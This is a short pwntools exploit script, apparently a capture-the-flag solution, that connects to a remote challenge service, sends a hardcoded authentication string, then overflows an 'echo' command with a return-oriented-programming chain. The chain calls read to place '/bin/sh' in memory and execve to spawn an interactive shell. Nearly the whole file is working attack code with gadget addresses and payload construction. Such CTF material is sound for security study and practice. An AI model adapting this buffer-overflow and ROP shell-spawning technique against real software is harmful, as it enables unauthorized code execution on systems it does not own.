
from pwn import *
context.log_level='debug'

filename = './service'
# proc = process(filename)
proc=remote("node4.anna.nssctf.cn", 28854)
belf = ELF(filename)

gscript = '''
    b * 0x0000000004C1882
    c
'''
# gdb.attach(proc, gdbscript=gscript)

poprdi_ret = 0x444fec
poprsi_ret = 0x41e818
poprdx_ret = 0x49e11d
poprax_ret = 0x40d9e6
syscall = 0x40328c

proc.sendlineafter(b'ciscnshell$ ', b'cert nAcDsMicN S33UAga1n@#!')


payload = b'echo '+b'h'*0x100+b' '+b'h'*0x103

# 避开影响地址
payload += b'+' * 8

# 调用syscall 0, read 到0x59FE70 上
payload += p64(0xdeadbeefdeadbeef) * 3
payload += p64(poprdi_ret) + p64(0)
payload += p64(poprax_ret) + p64(0)
payload += p64(poprsi_ret) + p64(0x59FE70)
payload += p64(poprdx_ret) + p64(20)
payload += p64(syscall)

#syscall 59, execve
payload += p64(poprax_ret) + p64(59)
payload += p64(poprdi_ret) + p64(0x59FE70)
payload += p64(poprsi_ret) + p64(0)
payload += p64(poprdx_ret) + p64(0)
payload += p64(syscall)

proc.sendlineafter(b'# ', payload)
proc.send(b"/bin/sh\x00")
proc.interactive()
pause()


